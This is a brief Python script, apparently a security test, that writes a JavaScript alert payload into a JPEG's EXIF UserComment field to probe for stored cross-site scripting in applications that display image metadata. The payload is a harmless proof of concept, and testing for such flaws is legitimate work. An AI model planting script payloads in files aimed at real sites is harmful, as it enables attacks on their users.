import piexif
from PIL import Image

# Load image
img_path = "valid_image_jpg.jpg"
img = Image.open(img_path)

# JavaScript payload
js_payload = "<script>alert('EXIF test');</script>"

# Encode as bytes for EXIF
user_comment = js_payload.encode('utf-8')

# Create EXIF dictionary
exif_dict = {"Exif": {piexif.ExifIFD.UserComment: user_comment}}
exif_bytes = piexif.dump(exif_dict)

# Save image with embedded JavaScript in EXIF
img.save("exif_javascript.jpg", exif=exif_bytes)
